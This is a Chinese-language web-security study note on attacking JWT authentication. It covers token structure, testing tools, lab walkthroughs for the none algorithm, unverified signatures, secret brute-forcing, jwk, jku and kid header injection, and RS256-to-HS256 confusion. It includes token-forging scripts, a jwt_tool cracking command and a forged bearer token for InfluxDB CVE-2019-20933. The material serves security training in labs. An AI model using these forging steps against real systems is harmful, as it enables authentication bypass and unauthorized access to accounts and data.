---
title: 身份验证篇&JWT令牌&空密钥&未签名&密钥爆破&JWK&JWU&KID&算法替换&CVE&报告复盘
published: 2026-07-17
description: JWT安全测试需关注空算法绕过、弱密钥爆破、JWK/JKU/KID注入及算法混淆（RS256转HS256）等漏洞。利用jwt_tool、Burp插件等工具可检测未授权访问、敏感信息泄露及越权风险，重点检查Token时效性及签名验证机制，通过篡改Payload或伪造签名实现权限提升。
tags:
  - JWT
  - 越权
  - Web攻防
category: 网络安全
draft: false
---

# 知识点

1. WEB攻防-JWT令牌-组成&识别&检测&安全  
2. WEB攻防-JWT令牌-空算法&未签名&爆破密钥  
3. WEB攻防-JWT令牌-JWK&JWU&KID&加密替换&CVE&报告复盘

# JWT

JSON Web Token(JWT)。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证 可以替代传统的cookie+session身份验证方法。这使得JWT成为高度分布式网站的热门选择，在这些网站中，用户需要与多个后端服务器无缝交互。

# JWT识别

## 标头（Header）

`Header`是JWT的第一个部分，是一个JSON对象，主要声明了JWT的签名算法，如`"HS256”、"RS256"`等，以及其他可选参数，如"kid"、"jku"、"x5u"等

`alg`字段通常用于表示加密采用的算法。如"HS256"、"RS256"等

`typ`字段通常用于表示类型

还有一些其他可选参数，如"kid"、"jku"、"jwk"等

## 有效载荷（Payload）

`Payload`是JWT的第二个部分，这是一个JSON对象，主要承载了各种声明并传递明文数据，用于存储用户的信息，如id、用户名、角色、令牌生成时间和其他自定义声明。

`iss：`该字段表示jwt的签发者。

`sub：`该jwt面向的用户。

`aud：`jwt的接收方。

`exp：`jwt的过期时间,通常来说是一个时间戳。

`iat：`jwt的签发时间,常来说是一个时间戳。

`jti：`此jwt的唯一标识。通常用于解决请求中的重放攻击。该字段在大多数地方没有被提及或使用。因为使用此字段就意味着必须要在服务器维护一张jti表， 当客户端携带jwt访问的时候需要在jti表中查找这个唯一标识是否被使用过。使用这种方式防止重放攻击似乎让jwt有点怪怪的感觉, 毕竟jwt所宣称的优点就是无状态访问。

## 签名（Signature）

`Signature`是对Header和Payload进行签名，具体是用什么加密方式写在`Header`的`alg` 中。同时拥有该部分的`JWT`被称为`JWS`，也就是签了名的JWT。

对Header和Payload进行签名，具体是用什么加密方式写在Header的alg中。

同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。

第一部分：对`JSON`的头部做`base64`编码处理得到

第二部分：对`JSON`类型的`payload`做`base64`编码处理得到

第三部分：分别对头部和载荷做`base64`编码，并使用.拼接起来

使用头部声明的加密方式，对`base64`编码前两部分合并的结果加盐加密处理，作为`JWT`

`HS256：`对称性加密（同一的密钥加密和解密） 可以采用爆破密钥攻击

`RS256：`非对称性加密（公钥和私钥，私钥解密或加密，公钥加密或解密）

# 识别检测利用项目

JWT在线解析：https://jwt.io/

**BURP插件：`Hae` & `JSON Web Tokens` & `JWT Editor` & `JWT-scanner`**

**JWT-scanner(漏洞检测)：https://github.com/CompassSecurity/jwt-scanner**

Venom-JWT(漏洞探测和密钥爆破)：https://github.com/z-bool/Venom-JWT

jwt_tool 综合利用工具(漏洞探测和密钥爆破)：https://github.com/ticarpi/jwt_tool

jwt-secrets(jwt爆破字典)：https://github.com/wallarm/jwt-secrets

# JWT安全

参考：blog.csdn.net/weixin_44288604/article/details/128562796

首先找到需要JWT鉴权后才能访问的页面，如个人资料页面，将请求重放测试：

1）未授权访问：删除Token后仍然可以正常响应对应页面。

2）敏感信息泄露：通过JWT.io解密出Payload后查看其中是否包含敏感信息，如弱加密的密码等。

3）破解密钥+越权访问：通过JWT.io解密出Payload部分内容，通过空加密算法或密钥爆破等方式实现重新签发Token并修改Payload部分内容，重放请求包，观察响应包是否能够越权查看其他用户资料。

4）检查Token时效性：解密查看payload中是否有exp字段键值对（Token过期时间），等待过期时间后再次使用该Token发送请求，若正常响应则存在Token不过期。

5）通过页面回显进行探测：如修改Payload中键值对后页面报错信息是否存在注入，payload中kid字段的目录遍历问题与sql注入问题。

## 实验室：通过未验证的签名绕过JWT身份验证

登录抓包发现：

```
Cookie:session=eyJxxxxx.xxxxx.xxxx
```

发送到repeater

可以用jwt在线解析修改，也可以直接用burpsuite的json web tokens插件进行修改，因为没有校验签名，所以直接将`sub`字段的用户改为管理员即可

## 实验室：通过有缺陷的签名验证绕过JWT身份验证

同上，只不过是这个加了签名算法，而验证是以当前发包`Header`中的`alg`为准，不是在代码中写死的加密算法，所以只需要将`alg`置空

在json web tokens插件中将用户修改为管理员，把加密算法置空绕过

## 实验室：通过弱签名密钥绕过JWT身份验证

这次就是对签名进行了校验，`alg`字段为基于对称加密的`HS256`签名算法，该算法是可以进行爆破的，因为是使用一个共享的密钥（secret key）来完成数据的签名和验证。这意味着签名和验证都依赖于同一个密钥。

可以使用jwt-tool或者hashcat

jwt-tool，-C 爆破模式、-d 指定字典

```
.\jwt_tool.py JWT值 -C -d .\jwt.secrets.list
```

利用burp的json web tokens插件进行验证，把jwt值和签名密钥填写，验证无误，后续就是重新生成JWT

**方法一**

还是利用json web tokens这个插件，先修改为administrator，之后选中`Recalculate Signature`填入签名密钥即可

**方法二**

使用JWT解析在线生成，同样也是修改用户，在验证签名处输入密钥

## 实验室：通过jwk标头注入绕过JWT身份验证

有些 `JWT` 验证库或者配置不当的服务端，在验证签名时，会优先使用 `JWT` 标头里自带的 `jwk` 参数提供的公钥，而不是使用服务器自己配置好的、信任的公钥（比如从固定文件或`URL`获取的）。

登录后台，使用burp插件JWT Editor，创建一个RSA Key，id自定义

在json web token中攻击->选用`Embedded JWK`->选中创建的RSA Key（此时报头部分就会以自己生成的jwk方式为准）->修改为管理员用户->签名->成功利用

## 实验室：通过jku标头注入绕过JWT身份验证

远程加载算法，重新组合

- 服务端配置的JWT 验证库支持并启用了jku参数的处理。
- 服务端没有严格校验jku 指向的URL是否可信。比如:
	- 没有检查URL的域名是否在白名单内(例如只允许 auth.mycompany.com)。
	- 没有对URL进行严格的过滤(允许攻击者指定任意URL，包括攻击者自己控制的服务器)
	- 没有验证从该URL下载的JWKSet内容的真实性和有效性(比如检查密钥的指纹、算法等)。
	- 攻击者能够托管一个恶意的JWK Set文件(在自己的服务器上)

登录后台，使用burp插件JWT Editor，创建一个RSA Key，id自定义

右键新建的RSA Key->`Copy Public Key as JWK`->放到靶场提供的服务器body部分->store->复制给出的URL->刷新页面抓包->在json web token插件的报头部分修改`kid`部分为自己生成时候自定义的id，之后加上一行`"jku":"给出的URL"`->修改用户为管理员

## 实验室：通过kid头路径遍历绕过JWT身份验证

文章参考：[https://blog.csdn.net/weixin_44288604/article/details/128562796](https://blog.csdn.net/weixin_44288604/article/details/128562796)

# 实验：算法混淆

## Web349（公钥私钥泄露）

打开该题目，会有一个泄露的js文件，内容为：

```js
// 关键代码部分
route.get('/',function(req,res,next)
{
	// 其他代码部分...
	var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');
	var token = jwt.sign({user:'user'},privateKey,{algorithm:'RS256'}); // RS256非对称加密
	// 其他代码部分...
});

route.post('/',function(req,res,next)
{
	// 其他代码部分...
	var auth = req.cookies.auth; // 接收值
	var privateKey = fs.readFileSync(process.cwd()+'//public//public.key');
	// 其他代码部分...
		if(decode.user=='admin')
		// 其他代码部分...
});
```

可以发现源码中私钥生成`jwt`，利用公钥解密`jwt`，只需要有私钥就可以重新生成`JWT`。

根据路径将密钥文件下载

```
GET /public/private.key
GET /public/public.key
```

先安装库

```
pip install PyJWT==1.7.1
```

payload：

```python
import jwt

public = open('private.key', 'r').read()
payload={"user":"admin"}
print(jwt.encode(payload, key=public, algorithm='RS256'))
```

## Web350(密钥混淆攻击RS256=>HS256)

同样给了源码，和上题只有路径不同，其他都一样

但是根据路径找公钥和私钥，发现只有一个公钥，但是是基于私钥生成的，所以只有公钥也没什么用

这时发现代码没有对解密算法做校验，也就是可以将本身的RS256算法改为HS256（非对称密码算法=>对称密码算法）

那么这时就可以利用已有的公钥，改为使用公钥进行签名和验证

HS256算法使用密钥为所有消息进行签名和验证。

而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。

```js
var jwt = require('jsonwebtoken');
var fs = require('fs');
var privateKey = fs.readFileSync('./public.key');
var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });
console.log(token)
```

# 某个测试目标

InfluxDB JWT未授权漏洞（CVE-2019-20933

参考：https://mp.weixin.qq.com/s/obiU3BaFoZ7272z2vS0QgQ

1. 添加该令牌，密钥要去空，username是固定
    
2. 提交数据需要以post方式提交，将抓取的数据包改为post，sql语句例如：db=sample&q=show users，得到用户回显

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo0MDcyNjE1MzE0fQ.mwI2P1j8CIvhxBKFvcyU7TNLBeuFtiUM1mPrKanF1w4

Content-Type: application/x-www-form-urlencoded
```

```
db=sample&q=show users
```

# 复盘

https://mp.weixin.qq.com/s/ITVFuQpA8OCIRj4wW-peAA

https://mp.weixin.qq.com/s/xuY1oTwFcM1pyiql0U3NPQ

https://mp.weixin.qq.com/s/AVW8DsnLiviopeJYQYKC3A

https://mp.weixin.qq.com/s/st0xma6KoRbo1NUp9rtZhw

https://mp.weixin.qq.com/s/9OL5jZK7S1MiEUb8Q_F1Pw

首先找到需要JWT鉴权后才能访问的页面，如个人资料页面，将请求重放测试：

1）未授权访问：删除Token后仍然可以正常响应对应页面

2）敏感信息泄露：通过JWt.io解密出Payload后查看其中是否包含敏感信息，如弱加密的密码等

3）破解密钥+越权访问：通过JWT.io解密出Payload部分内容，通过空加密算法或密钥爆破等方式实现重新签发Token并修改Payload部分内容，重放请求包，观察响应包是否能够越权查看其他用户资料

4）检查Token时效性：解密查看payload中是否有exp字段键值对（Token过期时间），等待过期时间后再次使用该Token发送请求，若正常响应则存在Token不过期

5）通过页面回显进行探测：如修改Payload中键值对后页面报错信息是否存在注入，payload中kid字段的目录遍历问题与sql注入问题
